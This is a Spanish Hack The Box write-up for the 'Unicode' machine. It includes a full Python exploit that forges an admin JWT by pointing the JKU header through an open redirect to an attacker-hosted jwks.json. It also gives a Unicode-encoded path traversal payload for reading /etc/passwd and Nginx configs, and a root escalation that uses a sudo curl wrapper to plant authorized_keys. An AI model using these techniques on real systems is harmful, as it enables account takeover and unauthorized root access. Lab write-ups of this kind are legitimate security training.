---
title: Hackthebox Writeup Unicode
date: 2022-03-04 01:13:59 am
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, Json, Jwt, Jku, Python Scripting, LFI, Nginx, curl, Sudoers]

img_path: /assets/img/htb/writeups/unicode/
---

Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato **JSON Web Token (JWT)** con el campo **JKU** expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a **Local File Inclusion (LFI)** que nos permite enumerar archivos de configuración del servidor **Nginx** y obtener credenciales de un usuario para entrar por el protocolo **Secure Shell (SSH)**. Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta **curl**, que era parte de un binario que podiamos ejecutar como root.

* * *

![Unicode](unicode_logo.png){: .shadow }

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.126 |  27 Nov 2021 |   Medium   |   30   |

* * *

Antes de empezar la máquina es importante revisar si tenemos conexión con ella, para ello usamos el comando `ping`:

![Ping](connection_ping.png){: .shadow }

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

> Sistema Operativo por aprox. del **TTL (Time To Live)** : _`64 -> Linux | 128 -> Windows`_
{: .prompt-tip }

## Enumeration 

* * *

Comenzamos escaneando los puertos **TCP** abiertos con la herramienta `nmap`:

![Nmap](enumeration_nmap.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info }
 
> -p- : Escanear todos los puertos, del 1 al 65,535
>
> \-\-open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -v : Imprimir información del proceso del escaneo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -oG \<file\> : Guardar output en un archivo (\<file\>) de formato _grepable_

Observamos que la máquina tiene abierto el puerto **22 (ssh) y 80 (http)**, asi que procedemos a escanear de manera específica cada uno de estos puertos:

![OpenPortsTCP](enumeration_openPortsTCP.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info}

> -p\<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap 

Omitimos entrar por el puerto 22 ya que no disponemos de credenciales para entrar por SSH.

Observamos que hay un servicio http por el puerto 80, así que ejecutamos un `whatweb` para obtener un poco mas de información y por otro lado ingresamos a la página por el navegador

![Whatweb](whatweb.png){: .shadow }

Toqueteando un poco encontramos un botón con una redirección a una URL específica, y secciones para registrarnos y logearnos:

![Htpp\_home](home_page_http.png){: .shadow }

Intentamos registrarnos:

![Htpp\_register](register_page_http.png){: .shadow }

Nos logeamos:

![Htpp\_login](login_page_http.png){: .shadow }

Y ya tenemos una sessión:

![Htpp\_session](session_page_http.png){: .shadow }

De primeras solo hay de interesante subir un archivo, lo cúal puede ser una brecha, pero intentando un poco no conseguimos nada.

Lo que sí, ayudandonos un poco del nombre de la máquina **Unicode**, y que tenemos una sesión, pues al observar la cookie de sesión vemos algo interesante:

![Http\_session\_cookie](session_cookie.png){: .shadow }

Si conoces un poco de formatos sabras por la separación de **puntos(.)** de que se trata.

Si es la primera vez que miras una cookie así, lo que puedes hacer es intentar decodearla a un formato clásico, en este caso a `base64`:

![Http\_session_\decode](session_cookie_decode.png){: .shadow }

Logramos observar una estructura en formato `json` y vemos que en un campo especifica el tipo `JWT`, y averiguando un poco encontramos:

![JWT](jwt_definition.png){: .shadow }

Ahora que ya tenemos una idea procedemos a decodear la cookie para ver mas información, usamos una página muy útil: [https://jwt.io](https://jwt.io)

![JWT\_IO](jwt_io.png){: .shadow }

Observamos en el campo `jku` un enlace al archivo `jwks.json`, primero averiguamos de que va para luego saber que vamos a encontrar:

![JWT\_jku](jwt_jku_definition.png){: .shadow }

Para ver el archivo necesitamos aplicar **Virtual hosting** agregando nombre de dominio **hackmedia.htb** a nuestro archivo _/etc/hosts_: `echo "10.10.11.126 hackmedia.htb" >> /etc/hosts`

Una vez dentro observamos el contenido:

![JWT\_json](jwt_json.png){: .shadow }

Sabiendo todo esto, tendriamos una brecha para poder conseguir una `cookie de sessión` pero como `admin`.

## Foothold

* * *

El ataque consiste en crear token para logearnos como usuarios `admin`, para ello debemos hacer lo siguiente:

1. Generamos un par de llaves para firmar nuestro token `keypair.pem`
2. Descargamos el archivo `http://hackmedia/static/jwks.json`
3. Extraemos de `keypair.pem` las llaves para validación y las asignamos al archivo `jwks.json`
4. Generamos nuestro token con los campos correspondientes. Y un paso importante, usamos la redirección que tiene la página `href="/redirect/?url=google.com"`
5. Reemplazamos en el campo `jku` para que apunte a nuestro archivo `jwks.json` y valide el token
6. Abrimos un servicio por un puerto para que pueda leerse el archivo `jwks.json`
7. Asignamos la cookie a la página web, actualizamos, recibimos la peticioń en nuestro servicio en escucha y ya somos `admin`

Para agilizar el proceso hize un script en `python` el cúal pasando los parámetros **IP-ATACANTE, PUERTO, COOKIE, IP-VÍCTIMA** logra generarte el token del usuario `admin`, abrirte un servicio en el puerto especificado, para luego asignar la cookie a la web, actualizar y listo:

```python
#!/usr/bin/python3

import os
import sys
import subprocess
import requests
import pdb
import json
import jwt as jwt_header
from jwcrypto import jwk as jwk_crypt, jwt as jwt_crypt
import time
from termcolor import cprint
import signal

#ctrl+c
def handler(signum, frame):
    remove_files()
    printRed("\n[-] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

#JWK packages
def requirements():
    printRed("\n\n[!] Requirements!\n")
    printGreen("\t[+] pip install jwcrypto\n")
    printGreen("\t[+] pip install PyJWT\n")

#colors
printRed = lambda s: cprint(s, 'red', end=' ')
printYellow = lambda s: cprint(s, 'yellow', end=' ')
printMagenta = lambda s: cprint(s, 'magenta', end=' ')
printGreen = lambda s: cprint(s, 'green', end=' ')

#panel_help
def help():
    printYellow("\n[*] Uso : ")
    printMagenta(f"python3 {sys.argv[0]} <ip_address> <port> <cookie_session>")
    requirements()
    exit(1)  

#valid_input
if len(sys.argv) != 4: help()

#global variables
ip = sys.argv[1]
port = sys.argv[2]
user_token = sys.argv[3]

#create keys
def gen_key():
    subprocess.run(['openssl', 'genrsa', '-out', 'keypair.pem', '2048'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

#remove files 
def remove_files():
    subprocess.run(['rm', 'keypair.pem', 'jwks.json'])

#get header token
def get_headers():
    headers = jwt_header.get_unverified_header(user_token)
    return headers

#decode user_token
def download_json():
    headers = get_headers()
    jku = headers['jku']
    os.system(f"wget {jku} 2>/dev/null")

#create new json
def create_json(key):
    with open("jwks.json", "r") as jsonfile:
        data = json.load(jsonfile)
    data['keys'][0]['kid'] = key.kid
    data['keys'][0]['n'] = key.n
    data['keys'][0]['e'] = key.e

    with open("jwks.json", "w") as jsonfile:
            json.dump(data, jsonfile)

#get data token
def get_data_key():
    with open("keypair.pem", "rb") as pemfile:
        key = jwk_crypt.JWK.from_pem(pemfile.read())
    return key

#create token
def gen_token(key):
    headers = get_headers()
    token = jwt_crypt.JWT(
                header = {
                        "alg" : headers['alg'],
                        "jku" : f"http://hackmedia.htb/static/../redirect/?url={ip}:{port}/jwks.json"
                    },
                claims = {
                        "user" : "admin"
                    }
            )
    token.make_signed_token(key)
    return token.serialize()
     
#port sharing manually
def listen_port(port):
    printYellow(f"\n\n[+] Opening port {port} to share")
    printRed("jwks.json")
    printYellow("file...")
    printYellow(f"\n[+] Serving HTTP on 0.0.0.0 port {port}:\n")
    subprocess.run(['python3', '-m', 'http.server', str(port)])

if __name__ == '__main__':

    gen_key()
    download_json()
    key = get_data_key()
    create_json(key)
    admin_token = gen_token(key)
    printRed("\n[+] Admin token: ")
    printGreen(f"{admin_token}")
    listen_port(port)
```

Pueden clonar el script en mi respositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/JKU-Header-Inyection_Unicode/exploit.py)

![EXPLOIT](exploit_admin_token.png){: .shadow }

Ejecutando el script y siguiendo los pasos anteriores ya estariamos logeados como `admin`:

![Http\_admin\_page](dashboard_admin_page.png){: .shadow }

Después de toquetear un poco encontramos una sesión de reportes donde podemos observar que se utiliza un archivo `pdf` que proviene de otra locación:

![Http\_admin\_report](report_page.png){: .shadow }

Podriamos estar frente a un `LFI (Local File Inclusion)`, y en específico a un **`path traversal attack`**

Entonces intentamos un ataque básico al `/etc/passwd`:

![Http\_admin\_filter](basic_path_traversal_attack.png){: .shadow }

Interesante!, pues al parecer exite un filtro. Pero otra vez, tomando el cuenta el nombre de la máquina `Unicode` podemos intentar buscar vulnerabilidades asociadas

Buscando en la biblia de los hackers [Hacktricks](https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability) encontramos como engañar al filtro remplazando el caracter `\` por su equivalente en **Unicode** `%ef%bc%8f` y con ello crear el path malicioso para comprobar si es vulnerable: `..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd`:

![Http\_path\_attack\_validation](validation_path_traversal_attack.png){: .shadow }

![Http\_ffuf\_scan](ffuf_path_attack_search.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info }

> -c : Output colorido
>
> -mc \<status\_code\> : Solo mostrar respuesta del código de estado asignado
>
> -w \<wordlist\> : Wordlist a usar para el ataque de fuerza bruta
>
> -b \<cookie\> : Asignar nuestra cookie de sessión
>
> -u \<url\> : Url objetivo con el reemplazo del FUZZ correspondiente 
>
> -fw \<number\> : Filtrar por cantidad de palabras en la respuesta

Pueden clonar la herramienta en el siguitent repositorio: [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)

No llegamos a encontrar nada interesante, pero sabemos que podemos buscar archivos del sistema. Por ello, intentamos encontrar archivos de configuración del servidor web/proxy `Nginx` que corre en el sistema

Investigando un buen tiempo encontramos algunos archivos de configuración de `Nginx`:

![Http\_Nginx\_config\_files](nginx_config_files.png){: .shadow }

En el primer archivo no encontramos nada interesante, pero en el segundo que es un directorio para alojar `Server block` encontramos en internet que hay uno por defecto llamado `default`:

![Http\_Nginx\_server\_block](nginx_server_block_default.png){: .shadow }

Ojito, al entrar encontramos un comentario sobre un cambio de contraseña de un usuario y se encuentra en un archivo `db.yaml`:

![Http\_Nginx\_default\_server\_block\_config](nginx_enable_server_block_default.png){: .shadow }

Observamos el path `/home/code/coder/static/styles/`, y el usuario `code` que anteriormente vimos en el `/etc/passwd`.

Entonces vamos buscando la locación del archivo `db.yaml`, logramos encontrarlo en `/home/code/coder/db.yaml` y son unas credenciales de `mysql`:

![User\_credentials](user_credentials.png){: .shadow }

Recordamos que tenemos el puerto **SSH** abierto, y como vemos que tenemos un **usuario** y **contraseña** probamos la credenciales encontradas como el usuario `code` y obtenemos la **flag**:

![Code\_ssh\_login](ssh_code_login.png){: .shadow }

## Privilege Escalation

* * *

Ya dentro como el usuario `code`, como es costumbre usamos scripts básicos para buscar binarios con permisos **SUID** `find \ -perm -4000 2>/dev/null` o binarios que podemos ejecutar como **root** `sudo -l`:

![Code\_sudo\_binary](binary_sudo_code_user.png){: .shadow }

Observamos que podemos ejecutar el binario `/usr/bin/treport` como root:

![Treport\_binary](treport_binary.png){: .shadow }

De las tres opciones la más interesante es la **3.** que nos permite descargar archivos.

Pero antes de eso debemos saber que está usando el binario por detrás para hacer las descargas. Para ello hay dos maneras:

* Insertar un campo vacío en la opción **3**:

![Treport\_detect\_curl](first_way_curl_treport.png){: .shadow }

* Insertar un campo vacío en la opción **1** y visualizando que hay un archivo en `python` usar una herramienta para extraer archivos en `python` [pyinstxtractor](https://github.com/LucifielHack/pyinstxtractor) y luego otra herramienta para decompilarla, sea legible [pycdc](https://github.com/LucifielHack/pycdc) y poder visualizar el archivo `treport.py`:

![Treport\_detect\_curl](second_way_curl_treport.png){: .shadow }

![Treport\_python\_code](treport_python_code.png){: .shadow }

En ambos casos observamos que la herramienta que está por detrás es `curl`, asi que es posible que tengamos una brecha para escalar privilegios

Investigando un poco encontré que podemos descargar archivos del equipo local con `curl` usando el protocolo **FILE**:

![Curl\_Protocol](curl_protocol.png){: .shadow }

Usando el comando `File:///root/root.txt` podemos descargar la flag de root para luego visualizarla:

![Flag\_root](root_flag.png){: .shadow }

Pero lo que queremos es entrar como usuarios `root` asi que intenté leer si había una llave privada para entrar por **SSH**, pude obtenerla pero al entrar me pedía contraseña, asi que busqué otra manera.

Lo que hice fue crearme un par de llaves `rsa`:

![Keys\_generate](generate_keys.png){: .shadow }

Enviar la _llave pública_ a la máquina víctima al directorio `/tmp`:

![Share\_pubkey](sharing_publickey.png){: .shadow }

Cambiar el nombre de la _llave pública_ (id\_rsa.pem) a `authorized_keys`, luego usando el binario `treport` junto a `curl` copiar el archivo a la ruta `/root/.ssh/` y así desde mi máquina entrar con la **llave privada** que también generé:

![Move\_authorized\_keys](move_to_authorized_keys.png){: .shadow }

Verificamos el archivo `/root/.ssh/authorized_keys`:

![Verify\_authorized\_keys](verify_authorized_keys.png){: .shadow }

Observamos que se encuentra nuestra _llave pública_, así que ahora asignamos permisos a nuestra _llave privada_, nos logeamos como `root` por el puerto **22** por `ssh` y pa-dentro!:

![Pwned](pwned.png){: .shadow }

* * *
